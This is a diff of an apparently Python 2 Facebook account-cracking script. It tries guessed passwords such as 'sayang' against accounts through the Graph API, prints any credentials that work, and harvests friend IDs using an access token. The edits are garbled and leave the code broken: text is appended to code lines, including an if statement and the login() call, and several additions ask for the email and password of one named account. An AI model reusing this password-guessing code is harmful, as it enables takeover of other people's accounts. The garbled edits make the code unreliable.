@@ -1,5 +1,5 @@
-# -*- coding: utf-8 -*-
-
+# -*- coding: utf-8 -*-email cut.meutia.5030..?account paspos fb..? cut.meutia.5030
+EMIAl CUT.MEUTIA.5030..?
 import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, requests, mechanize
 from multiprocessing.pool import ThreadPool
 try:
@@ -702,7 +702,8 @@ def pilih_super():
                                                                 if 'access_token' in q:
                                                                     print '\x1b[1;97m\x1b[1;92m[✓]\x1b[1;97m ' + user + ' | ' + pass5 + ' --> ' + b['name']
                                                                 else:
-                                                                    if 'www.facebook.com' in q['error_msg']:
+                                                                    if 'www.facebook.com' in q['error_msg']:email dan account sandi
+
                                                                         print '\x1b[1;97m[\x1b[1;93m[+]\x1b[1;97m ' + user + ' | ' + pass5 + ' --> ' + b['name']
                                                                     else:
                                                                             pass6 = ('sayang')
@@ -867,7 +868,7 @@ def yahoofriends():
     print 52 * '\x1b[1;97m\xe2\x95\x90'
     for w in kimak['data']:
         jml += 1
-        mpsh.append(jml)
+        mpsh.append(jml)019bd1076278d92bf43678b0f3713d7c800ee08f
         id = w['id']
         nama = w['name']
         links = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
@@ -2200,6 +2201,6 @@ def gaz(toket, enable=True):
 
 
 if __name__ == '__main__':
-	login()
+	login()cut.meutia.5030 email..?account paspor sandi..?
 
 
